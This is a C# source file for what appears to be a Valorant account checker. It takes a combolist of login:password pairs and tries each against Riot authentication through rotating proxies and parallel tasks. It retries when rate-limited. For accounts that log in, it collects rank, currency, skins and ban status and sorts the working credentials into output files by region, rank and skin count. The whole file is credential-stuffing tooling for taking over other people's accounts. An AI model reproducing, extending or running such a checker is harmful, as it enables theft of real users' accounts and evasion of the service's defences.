using System;
using System.Security.Principal;
using System.Threading;
using valchecker;
using valchecker_4._0_private_beta;

public static class uitools
{
    private static long premillis = 0;
    private static int prechecked = 0;
    public static async Task countcpm()
    {
        int precpm = accountsinfodb.cpm;
        int nowchecked = accountsinfodb.checkednum;
        long currentmillis = DateTimeOffset.Now.ToUnixTimeMilliseconds();
        if (premillis != 0 && currentmillis-premillis >= 60000)
        {
            int cpm = nowchecked - prechecked;
            char cpmarrow = precpm > cpm ? '↓' : '↑';
            string cpmtext = $"{cpmarrow} {cpm} cpm";
            prechecked = nowchecked;
            TextChangeHandler.RaiseTextChangeEvent(cpmtext, "cpmlbl");
        }
        premillis = currentmillis;
        prechecked = nowchecked;
    }
}

public class accountsinfodb
{
    public static int cpm = 0;
    public static int checkednum = 0;
    public static int totalnum = 0;
    public static int valid = 0;
    public static int banned = 0;
    public static int tempbanned = 0;
    public static int rlimits = 0;
    public static int retries = 0;

    public static Dictionary<string, int> ranks = new Dictionary<string, int>()
        {
            { "unranked", 0 },
            { "iron", 0 },
            { "bronze", 0 },
            { "silver", 0 },
            { "gold", 0 },
            { "platinum", 0 },
            { "diamond", 0 },
            { "ascendant", 0 },
            { "immortal", 0 },
            { "radiant", 0 },
            { "locked", 0 }
        };
    public static Dictionary<string, int> regions = new Dictionary<string, int>()
        {
            { "eu", 0 },
            { "na", 0 },
            { "br", 0 },
            { "latam", 0 },
            { "ap", 0 },
            { "kr", 0 }
        };
    public static Dictionary<string, int> skinsam = new Dictionary<string, int>()
        {
            { "1-10", 0 },
            { "10-20", 0 },
            { "20-45", 0 },
            { "45-65", 0 },
            { "65-100", 0 },
            { "100+", 0 }
        };
    public static int withskins = 0;
    public static int withfa = 0;
    public static async Task updateinfo(Account account)
    {
        if (account.rank != null) { ranks[account.rank.Split(" ")[0].ToLower()] += 1; }
        if (account.region != null) { regions[account.region.ToLower()] += 1; }
        if (account.unverifiedmail) { withfa += 1; }
        if (account.skins != null && account.skins.Count > 0)
        {
            int _num = account.skins.Count;
            if (_num >= 1 && _num < 10) { TextChangeHandler.RaiseTextChangeEvent($"1-10: {++accountsinfodb.skinsam["1-10"]}",
                "onetotenlbl"); }
            else if (_num >= 10 && _num < 20) { TextChangeHandler.RaiseTextChangeEvent($"10-20: {++accountsinfodb.skinsam["10-20"]}",
                "tentotwentylbl"); }
            else if(_num >= 20 && _num < 45) { TextChangeHandler.RaiseTextChangeEvent($"20-45: {++accountsinfodb.skinsam["20-45"]}",
                "twentytofortyfivelbl"); }
            else if (_num >= 45 && _num < 65) { TextChangeHandler.RaiseTextChangeEvent($"45-65: {++accountsinfodb.skinsam["45-65"]}",
                "fortyfivetosixtyfivelbl"); }
            else if (_num >= 65 && _num < 100) { TextChangeHandler.RaiseTextChangeEvent($"65-100: {++accountsinfodb.skinsam["65-100"]}",
                "sixtyfivetoahundredlbl"); }
            else if (_num >= 100) { TextChangeHandler.RaiseTextChangeEvent($"100+: {++accountsinfodb.skinsam["100+"]}",
                "ahundredpluslbl"); }
            TextChangeHandler.RaiseTextChangeEvent($"Skinned: {++accountsinfodb.withskins}", "wskinslbl");
        }
    }
    public static async Task generate_file(Account account)
    {
        string space = " ";
        if (!Directory.Exists("output")) { Directory.CreateDirectory("output"); }
        string mainpath = $"output\\{someusefulshit.foldername}";
        if (!Directory.Exists($"{mainpath}\\skins")) { Directory.CreateDirectory($"{mainpath}\\skins"); }
        if (!Directory.Exists($"{mainpath}\\regions")) { Directory.CreateDirectory($"{mainpath}\\regions"); }
        string accountinfo2write =
            "╔═════════════════════════════════════════════════════════════╗\n" +
           $"║            | {account.logpass} |{someusefulshit.multiply(space, 49-$"| {account.logpass} |".Length)}║\n";
        if(account.banuntil != null)
        {
            accountinfo2write += $"║ Banned until {account.banuntil}{someusefulshit.multiply(space, 61 - $" Banned until {account.banuntil}".Length)}║\n";
        }
        else
        {
            accountinfo2write += "║                                                             ║\n";
        }
        accountinfo2write += $"║                                                             ║\n" +
            $"║ Full Access: {account.unverifiedmail} | Level: {account.lvl} | Region: {account.region} , {account.country}" +
            $"{someusefulshit.multiply(space, 61-$" Full Access: {account.unverifiedmail} | Level: {account.lvl} | Region: {account.region} , {account.country}".Length)}║\n" +
            $"║ Rank: {account.rank} | Last Played: {account.lastplayed}{someusefulshit.multiply(space, 61-$" Rank: {account.rank} | Last Played: {account.lastplayed}".Length)}║\n" +
            $"║ Valorant Points: {account.vp} | Radianite: {account.rp} | Skins: {account.skins.Count}" +
            $"{someusefulshit.multiply(space, 61-$" Valorant Points: {account.vp} | Radianite: {account.rp} | Skins: {account.skins.Count}".Length)}║\n" +
            $"║ Creation date: {account.registerdate}{someusefulshit.multiply(space, 61-$" Creation date: {account.registerdate}".Length)}║\n" +
            $"║ Gamename: {account.gamename}#{account.tagline}{someusefulshit.multiply(space, 61-$" Gamename: {account.gamename}#{account.tagline}".Length)}║\n" +
            $"╠═════════════════════════════════════════════════════════════╣\n" +
            $"{string.Join("\n",account.skins)}\n" +
            $"╚═════════════════════════════════════════════════════════════╝";

        if(account.banuntil != null)
        {
            File.AppendAllText($"{mainpath}\\tempbanned.txt", $"{accountinfo2write}\n\n");
            return;
        }
        if(account.skins != null && account.skins.Count > 0)
        {
            int _num = account.skins.Count;
            if (_num >= 1 && _num < 10)
            {
                if (!Directory.Exists($"{mainpath}\\skins\\1-10")) { Directory.CreateDirectory($"{mainpath}\\skins\\1-10"); }
                File.AppendAllText($"{mainpath}\\skins\\1-10\\{account.region}.txt", $"{accountinfo2write}\n\n");
            }
            else if (_num >= 10 && _num < 20) 
            {
                if (!Directory.Exists($"{mainpath}\\skins\\10-20")) { Directory.CreateDirectory($"{mainpath}\\skins\\10-20"); }
                File.AppendAllText($"{mainpath}\\skins\\10-20\\{account.region}.txt", $"{accountinfo2write}\n\n");
            }
            else if (_num >= 20 && _num < 45)
            {
                if (!Directory.Exists($"{mainpath}\\skins\\20-45")) { Directory.CreateDirectory($"{mainpath}\\skins\\20-45"); }
                File.AppendAllText($"{mainpath}\\skins\\20-45\\{account.region}.txt", $"{accountinfo2write}\n\n");
            }
            else if (_num >= 45 && _num < 65)
            {
                if (!Directory.Exists($"{mainpath}\\skins\\45-65")) { Directory.CreateDirectory($"{mainpath}\\skins\\45-65"); }
                File.AppendAllText($"{mainpath}\\skins\\45-65\\{account.region}.txt", $"{accountinfo2write}\n\n");
            }
            else if (_num >= 65 && _num < 100)
            {
                if (!Directory.Exists($"{mainpath}\\skins\\65-100")) { Directory.CreateDirectory($"{mainpath}\\skins\\65-100"); }
                File.AppendAllText($"{mainpath}\\skins\\65-100\\{account.region}.txt", $"{accountinfo2write}\n\n");
            }
            else if (_num >= 100)
            {
                if (!Directory.Exists($"{mainpath}\\skins\\100+")) { Directory.CreateDirectory($"{mainpath}\\skins\\100+"); }
                File.AppendAllText($"{mainpath}\\skins\\100+\\{account.region}.txt", $"{accountinfo2write}\n\n");
            }
        }

        if(account.region != null)
        {
            if (!Directory.Exists($"{mainpath}\\regions\\{account.region}")) { Directory.CreateDirectory($"{mainpath}\\regions\\{account.region}"); }
            File.AppendAllText($"{mainpath}\\regions\\{account.region}\\{account.rank}.txt", $"{accountinfo2write}\n\n");
        }
        File.AppendAllText($"{mainpath}\\valid.txt", $"{accountinfo2write}\n\n");
    }
}

public static class mainProgram
{
    public static async Task Main(string? logpass = null)
    {
        await someusefulshit.load_assets();
        skinsjsonloader.load();
        var lines = vars.combolist;
        accountsinfodb.totalnum = lines.Count;
        TextChangeHandler.RaiseTextChangeEvent($"Checked: 0/{accountsinfodb.totalnum}", "checkedlabel");
        int num = 0;
        int threadam = vars.threadsam;
        var tasks = new List<Task>();

        while (num < lines.Count)
        {
            while (tasks.Count >= threadam)
            {
                tasks.RemoveAll(task => task.IsCompleted);
                await Task.Delay(100);
            }
            Console.WriteLine(lines[num]);

            Task task = checkaccount(lines[num]);
            tasks.Add(task);
            num++;
            await uitools.countcpm();
        }

        // Wait for all tasks to complete
        await Task.WhenAll(tasks);
    }

    private static async Task checkaccount(string line)
    {
        RiotClient client;
        Account account;
        client = new RiotClient();
        while (true)
        {
            var proxy = await proxysystem.get_proxy();
            account = await client.AuthAsync(line.Trim(), proxy);
            Console.WriteLine($"{account.errmsg}");
            //Console.ReadLine();
            if (account.code == 2 || account.code == 6 || account.code == 3)
            {
                TextChangeHandler.RaiseTextChangeEvent($"Retries: {++accountsinfodb.retries}", "retrieslbl");
                continue;
            }
            else if(account.code == 1)
            {
                TextChangeHandler.RaiseTextChangeEvent($"Retries: {++accountsinfodb.retries}", "retrieslbl");
                await Task.Delay(30000);
                continue;
            }
            break;
        }
        Console.WriteLine(account.errmsg != null ? account.errmsg : account.code);
        if(account.code == 0 && account.region != null)
        {
            await accountinfo.get_rank(account);
            await accountinfo.get_lastplayed(account);
            await accountinfo.get_balance(account);
            await accountinfo.get_skins(account);
            if(account.banuntil == null) await accountsinfodb.updateinfo(account);
            Console.WriteLine(account.ToString());
        }

        if (account.code == 0 && account.banuntil == null) { TextChangeHandler.RaiseTextChangeEvent($"Valid: {++accountsinfodb.valid}", "validlabel"); }
        else if (account.code == 4)
        {
            TextChangeHandler.RaiseTextChangeEvent($"Banned: {++accountsinfodb.banned}", "bannedlabel");
            TextChangeHandler.RaiseTextChangeEvent($"Checked: {++accountsinfodb.checkednum}/" +
                            $"{accountsinfodb.totalnum}", "checkedlabel");
            return;
        }
        if (account.code == 0 && account.banuntil != null)
        {
            TextChangeHandler.RaiseTextChangeEvent(
            $"TempBanned: {++accountsinfodb.tempbanned}", "tempbannedlbl");
        }
        TextChangeHandler.RaiseTextChangeEvent($"Checked: {++accountsinfodb.checkednum}/" +
                        $"{accountsinfodb.totalnum}", "checkedlabel");
        if (account.region == null) { return; }
        TextChangeHandler.RaiseTextChangeEvent($"{account.region.ToUpper()}: {accountsinfodb.regions[account.region]}",
            $"{account.region}lbl");
        string regtochange = account.rank.Contains("Bronze") ? "bro" : account.rank.ToLower().Substring(0, 2);
        TextChangeHandler.RaiseTextChangeEvent($"{account.rank.Split(" ")[0]}: {accountsinfodb.ranks[account.rank.ToLower().Split(" ")[0]]}",
            $"{regtochange}lbl");
        await accountsinfodb.generate_file(account);
    }
}